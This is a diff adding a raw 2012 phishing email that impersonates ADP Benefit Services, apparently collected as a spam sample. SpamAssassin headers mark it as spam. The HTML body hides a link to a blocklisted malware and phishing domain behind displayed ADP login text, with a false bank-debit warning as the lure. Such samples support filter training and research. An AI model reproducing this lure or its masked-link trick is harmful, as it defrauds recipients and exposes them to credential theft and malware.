@@ -1,0 +1,73 @@
+Return-Path: <ADPClientServices@adp.com>
+X-Spam-Checker-Version: SpamAssassin 3.3.2 (2011-06-06) on www546b.sakura.ne.jp
+X-Spam-Flag: YES
+X-Spam-Level: ***********
+X-Spam-Status: Yes, score=11.7 required=7.0 tests=BAYES_50,HTML_MESSAGE,
+	HTTPS_HTTP_MISMATCH,MIME_HTML_ONLY,RAZOR2_CF_RANGE_51_100,
+	RAZOR2_CF_RANGE_E8_51_100,RAZOR2_CHECK,URIBL_DBL_SPAM,URIBL_PH_SURBL,
+	URIBL_WS_SURBL,URI_MALWARE_BH autolearn=no version=3.3.2
+X-Spam-Report: 
+	*  0.6 URIBL_PH_SURBL Contains an URL listed in the PH SURBL blocklist
+	*      [URIs: carroceriasedzon.com]
+	*  1.6 URIBL_WS_SURBL Contains an URL listed in the WS SURBL blocklist
+	*      [URIs: carroceriasedzon.com]
+	*  1.7 URIBL_DBL_SPAM Contains an URL listed in the DBL blocklist
+	*      [URIs: carroceriasedzon.com]
+	*  1.0 URI_MALWARE_BH URI: Possible BlackHole malware links / phishing
+	*  2.0 HTTPS_HTTP_MISMATCH BODY: HTTPS_HTTP_MISMATCH
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.8 BAYES_50 BODY: Bayes spam probability is 40 to 60%
+	*      [score: 0.4193]
+	*  0.7 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.9 RAZOR2_CF_RANGE_E8_51_100 Razor2 gives engine 8 confidence level
+	*      above 50%
+	*      [cf: 100]
+	*  0.5 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+	*      [cf: 100]
+	*  0.9 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+Received: from www546b.sakura.ne.jp (ksav11.sakura.ne.jp [210.224.165.45])
+	by www546b.sakura.ne.jp (8.14.3/8.14.3) with ESMTP id q9BJgwYE098055
+	for <hobby.division@sportshobby.co.jp>; Fri, 12 Oct 2012 04:42:58 +0900 (JST)
+	(envelope-from ADPClientServices@adp.com)
+X-Nat-Received: from [112.78.125.46]:62581 [ident-empty]
+	by smtp-proxy.isp with TPROXY id 1349984578.7515
+Received: from [190.234.72.105] (client-201.230.166.83.speedy.net.pe [201.230.166.83] (may be forged))
+	by www546b.sakura.ne.jp (8.14.3/8.14.3) with ESMTP id q9BJguva098051
+	for <hobby.division@sportshobby.co.jp>; Fri, 12 Oct 2012 04:42:57 +0900 (JST)
+	(envelope-from ADPClientServices@adp.com)
+Message-ID: <20121011144254.0E14B928AF21879B26A54@RIZZ>
+Date: Thu, 11 Oct 2012 14:42:54 -0500
+From: "ADPClientServices" <ADPClientServices@adp.com>
+MIME-Version: 1.0
+To: <hobby.division@sportshobby.co.jp>
+Subject: Debit Draft
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+X-Anti-Virus: Kaspersky Anti-Virus for Linux Mail Server 5.6.45.2/RELEASE, bases: 11102012 #8089632, status: clean
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Transaction Report</title>
+</head>
+
+<body>
+
+<p>Your Transaction Report(s) have been uploaded to the web site:<br />
+<br />
+<a href="http://carroceriasedzon.com/MZ2xPPQq/index.html">https://www.flexdirect.adp.com/client/login.aspx</a><br />
+<br />
+Please note that your bank account will be debited within one banking business
+day for the amount(s) shown on the report(s).<br />
+<br />
+Please do not respond or reply to this automated e-mail. If you have any
+questions or comments, please Contact your ADP Benefits Specialist.<br />
+<br />
+Thank You,<br />
+ADP Benefit Services</p>
+
+</body>
+
+</html>
